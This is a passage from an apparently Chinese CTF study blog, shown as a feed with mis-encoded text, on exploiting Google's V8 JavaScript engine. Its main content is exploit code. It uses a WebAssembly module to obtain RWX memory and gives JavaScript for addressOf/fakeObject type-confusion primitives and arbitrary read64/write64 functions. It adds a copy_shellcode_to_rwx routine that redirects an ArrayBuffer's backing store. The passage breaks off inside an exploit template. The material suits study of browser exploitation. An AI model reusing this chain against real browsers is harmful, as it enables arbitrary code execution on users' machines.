function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>V8é€šç”¨åˆ©ç”¨é“¾</title>
    <link href="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>ï¼ˆå’•å’•å’•äº†å¥½ä¹…â€¦â€¦ï¼‰åŸºç¡€pwnæš‚æ—¶å‘Šä¸€æ®µè½äº†ï¼Œæœ¬æ¥æ‰“ç®—å¼€kernelçš„ï¼Œä½†XCTFè§åˆ°äº†V8æ‰€ä»¥ç ”ç©¶ä¸€ä¸‹ã€‚é…ç¯å¢ƒçœŸåç‰¢â€¦â€¦æœ¬æ¥éƒ½é…å¥½äº†è™šæ‹Ÿæœºä¸å°å¿ƒè¢«æˆ‘ç©å´©äº†è¿˜æ²¡å¤‡ä»½(â•¯â–”çš¿â–”)â•¯è¿˜å› ä¸ºä¸€äº›å¾ˆå±‘çš„åŸå› ï¼ˆå°‘åŠ äº†åŒå¼•å·(Ë‰â–½Ë‰ï¼›)â€¦ï¼‰åˆèŠ±äº†å¥½ä¹…å†é…äº†ä¸€éâ€¦â€¦<br>psï¼šç›®å‰çš„å­¦ä¹ æŒ‰ç…§ä»â€œ0å¼€å§‹å­¦V8æ¼æ´åˆ©ç”¨â€ç³»åˆ—è¿›è¡Œ</p><span id="more"></span><h1 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h1><p>åšpwné¢˜çš„æ—¶å€™æˆ‘ä»¬çš„ç›®æ ‡å¾€å¾€å°±æ˜¯æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)ï¼ŒV8åˆ©ç”¨çš„ç›®æ ‡å°±æ˜¯æ‰§è¡Œä»»æ„shellcodeï¼Œè¦è¾¾æˆè¿™ä¸ªç›®æ ‡æˆ‘ä»¬å°±éœ€è¦è¯»å†™ç›¸å…³æ¼æ´+ä¸€æ®µrwxçš„å†…å­˜<br>wasmå¯ä»¥ä¸ºæˆ‘ä»¬åˆ¶é€ rwxçš„å†…å­˜<br>psï¼šwasmæ— æ³•æ‰§è¡Œshellcodeï¼ˆè¿˜ä¸æ¸…æ¥šä¸ºå•¥ï¼Œä¹‹åå†ç ”ç©¶ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥å†™shellcodeä»€ä¹ˆçš„åˆ«æƒ³äº†o( ï¿£â–½ï¿£)ãƒ–<br>ppsï¼šåœ¨åˆ«çš„åšå®¢é‡Œè¿˜æœ‰ç”¨å¸¸è§„å †é¢˜æ€è·¯åšçš„ï¼Œä¹‹åå†ç ”ç©¶<br>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å…ˆç”Ÿæˆä¸€æ®µåˆæ³•çš„wasmå†å†™å…¥éæ³•çš„shellcode<br>test.jså¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%<span class="hljs-title class_">SystemBreak</span>();<br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br>%<span class="hljs-title class_">DebugPrint</span>(f);<br>%<span class="hljs-title class_">DebugPrint</span>(wasmInstance);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ–­ç‚¹æ—¶vmmapä¸€ä¸‹æœ‰ä¸€æ®µrwxçš„å†…å­˜</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/rwx.png" class title="rwx"><p>å˜é‡fï¼ˆå‡½æ•°å¯¹è±¡ï¼‰çš„ç›¸å…³ä¿¡æ¯ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/f.png" class title="f"><p>ç»è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç°f.shared_info.data.instance&#x3D;&amp;wasmInstanceï¼ˆå…ˆä¸çº ç»“è¿™äº›å±æ€§åˆ°åº•æ˜¯å•¥ï¼‰<br>shared_infoï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/shared_info.png" class title="shared_info"><p>dataï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/data.png" class title="data"><p>wasmInstanceï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/wasminstance.png" class title="wasminstance"><p>instanceï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/instance.png" class title="instance"><p>å¯è§rwxçš„åœ°å€å†™åœ¨instance+0x68çš„ä½ç½®ï¼Œæˆ‘ä»¬è¦æŠŠshellcodeå†™åœ¨è¿™</p><h1 id="ä»»æ„è¯»å†™"><a href="#ä»»æ„è¯»å†™" class="headerlink" title="ä»»æ„è¯»å†™"></a>ä»»æ„è¯»å†™</h1><h2 id="å†…å­˜å¸ƒå±€"><a href="#å†…å­˜å¸ƒå±€" class="headerlink" title="å†…å­˜å¸ƒå±€"></a>å†…å­˜å¸ƒå±€</h2><p>test.jså¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a = [<span class="hljs-number">2.1</span>];<br>b = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br>c = [b];<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">DebugPrint</span>(b);<br>%<span class="hljs-title class_">DebugPrint</span>(c);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ¥çœ‹açš„å†…å­˜å¸ƒå±€ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/a.png" class title="a"><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/aa.png" class title="aa"><ul><li><p>0x142508049970-0x142508049980çš„éƒ¨åˆ†æ˜¯açš„ç»“æ„ä½“</p></li><li><p>V8å°†æœ€åä¸€ä½ç½®1è¡¨ç¤ºæŒ‡é’ˆï¼Œç½®0è¡¨ç¤ºSMIå½“å‰ç‰ˆæœ¬çš„V8å¯¹åœ°å€è¿›è¡Œäº†å‹ç¼©ï¼Œå› ä¸ºé«˜32bitçš„åœ°å€å€¼æ˜¯ä¸€æ ·çš„</p></li><li><p>æ‰€ä»¥açš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements addr|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure><p>elementsç»“æ„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/elements.png" class title="elements"></li><li><p>0x142508049960-0x142508049970çš„éƒ¨åˆ†æ˜¯elementsç»“æ„</p></li><li><p>elementsçš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit length|value|<br></code></pre></td></tr></table></figure></li></ul><p>å‘ç°elementsç»“æ„ä¹‹åæ˜¯ç´§æ¥ç€å°±æ˜¯açš„ç»“æ„ï¼Œå¦‚æœè®©elementsæº¢å‡ºæˆ‘ä»¬å°±èƒ½æ§åˆ¶açš„mapå’Œlengthç»“æ„<br>bçš„å†…å­˜ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/b.png" class title="b"><p>cçš„å†…å­˜ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/c.png" class title="c"><p>cçš„å†…å­˜å’Œaçš„å†…å­˜åˆ†å¸ƒåŸºæœ¬ä¸€è‡´</p><h2 id="ä»»æ„å˜é‡åœ°å€è¯»"><a href="#ä»»æ„å˜é‡åœ°å€è¯»" class="headerlink" title="ä»»æ„å˜é‡åœ°å€è¯»"></a>ä»»æ„å˜é‡åœ°å€è¯»</h2><p>JSArrayç”¨mapç»“æ„æ¥åŒºåˆ†å‚¨å­˜çš„æ•°æ®ç±»å‹ï¼ˆelements kindï¼‰ï¼Œå¦‚æœæˆ‘ä»¬å°†cçš„mapåœ°å€æ”¹æˆaçš„ï¼Œé‚£ä¹ˆæ‰§è¡Œc[0]æ—¶å°±ä¼šå°†bçš„åœ°å€å½“æˆæµ®ç‚¹æ•°æ¥è§£æï¼ˆç±»å‹æ··æ·†ï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²å˜é‡åœ°å€ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>å°†c[0]çš„å€¼è®¾ç½®ä¸ºæƒ³è¦è·å–åœ°å€çš„å˜é‡ï¼Œæ¯”å¦‚a</li><li>é€šè¿‡æ¼æ´å°†cçš„mapåœ°å€æ”¹æˆaçš„</li><li>è¯»å–c[0]çš„å€¼ï¼Œè¯¥å€¼ä¸ºaçš„ä½32bitåœ°å€<br>ä¸Šè¿°æ­¥éª¤å¯è¢«å°è£…ä¸ºaddressOfå‡½æ•°</li></ul><h2 id="ä¼ªé€ å¯¹è±¡"><a href="#ä¼ªé€ å¯¹è±¡" class="headerlink" title="ä¼ªé€ å¯¹è±¡"></a>ä¼ªé€ å¯¹è±¡</h2><p>åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠæµ®ç‚¹å‹æ•°ç»„å˜æˆå¯¹è±¡å‹æ•°ç»„ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>å°†a[0]çš„å€¼è®¾ä¸ºæ„é€ çš„å¯¹è±¡åœ°å€+1</li><li>é€šè¿‡æ¼æ´å°†açš„mapåœ°å€ä¿®æ”¹æˆcçš„</li><li>è·å–a[0]çš„å€¼<br>è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¢«å°è£…æˆfakeObjå‡½æ•°</li></ul><h2 id="ä»»æ„è¯»"><a href="#ä»»æ„è¯»" class="headerlink" title="ä»»æ„è¯»"></a>ä»»æ„è¯»</h2><p>æ„é€ è¿™æ ·ä¸€ä¸ªå˜é‡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[<br>double_array_map,<br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br></code></pre></td></tr></table></figure><p>å˜é‡ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(elements)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit length|<span class="hljs-number">64</span> bit double_array_map|<span class="hljs-number">64</span> bit <span class="hljs-number">0x4141414141414141n</span>|<br>(fake_array)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨addressOfè·å–fake_arrayåœ°å€ï¼Œ-0x10å¾—åˆ°fake_objectåœ°å€ï¼ˆç”¨double_array_mapä¼ªé€ mapå’Œpropertiesï¼Œç”¨itof(0x4141414141414141)ä¼ªé€ elementså’Œlengthï¼‰ï¼Œç„¶åä½¿ç”¨fakeObjå‡½æ•°å°†æµ®ç‚¹æ•°ç»„ä¼ªé€ æˆå¯¹è±¡æ•°ç»„<br>ä»¥ä¸Šè¿‡ç¨‹å¯ä»¥æ‰“åŒ…æˆä»»æ„è¯»å‡½æ•°read64ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64_addr</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="ä»»æ„å†™"><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h2><p>åŒç†ä¹Ÿèƒ½æ„é€ ä»»æ„å†™å‡½æ•°write64ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64_addr</span>(<span class="hljs-params">addr,data</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    fake_object[<span class="hljs-number">0</span>]=data;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="å†™shellcode"><a href="#å†™shellcode" class="headerlink" title="å†™shellcode"></a>å†™shellcode</h2><p>ä½†ä¸Šè¿°ä»»æ„å†™æ²¡æ³•æŠŠshellcodeå†™å…¥rwxåŒºåŸŸï¼Œå› ä¸ºå†™å…¥çš„åœ°å€&#x3D;å®é™…åœ°å€-0x8+0x1ï¼Œè¿˜éœ€è¦ä¼ªé€ 64bitçš„mapå’Œlengthï¼Œä½†éœ€è¦å†™å…¥shellcodeçš„åœ°å€æ˜¯rwxåœ°å€æ®µçš„èµ·å§‹ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä¼ªé€ mapå’Œlengthï¼ˆæˆ‘çš„ç†è§£æ˜¯æ­£å¸¸çš„elementsç»“æ„æœ‰mapå’Œlengthä¸”æ­£å¸¸æ”¹å†™éœ€è¦åˆæ³•çš„è¿™ä¸¤ä¸ªç»“æ„ï¼‰ï¼Œéœ€è¦å¦è¾Ÿè¹Šå¾„<br>æµ‹è¯•ä»£ç test.jså¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>data_view.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-literal">true</span>);<br><br>%<span class="hljs-title class_">DebugPrint</span>(data_buf);<br>%<span class="hljs-title class_">DebugPrint</span>(data_view);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>data_bufå˜é‡çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/buf.png" class title="buf"><p>å†çœ‹çœ‹backing_storeå­—æ®µçš„å€¼ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/backstore.png" class title="backstore"><p>doubleå‹çš„2.0çš„åå…­è¿›åˆ¶è¡¨ç¤ºå°±æ˜¯0x4000000000000000ï¼Œæ²¡æœ‰mapå’Œlengthï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ç±»å‹å°†shellcodeå†™å…¥rwxå†…å­˜<br>çœ‹çœ‹data_bufçš„å†…å­˜å¸ƒå±€ï¼š</p><img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/bufbuf.png" class title="bufbuf"><p>backing_storeå­—æ®µåœ¨data_buf+0x1c<br>å°†ä¸Šè¿°æ­¥éª¤å°è£…æˆcopy_shellcode_to_rwxå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç±»å‹æ··æ·†ç±»æ¼æ´æ¨¡æ¿"><a href="#ç±»å‹æ··æ·†ç±»æ¼æ´æ¨¡æ¿" class="headerlink" title="ç±»å‹æ··æ·†ç±»æ¼æ´æ¨¡æ¿"></a>ç±»å‹æ··æ·†ç±»æ¼æ´æ¨¡æ¿</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span 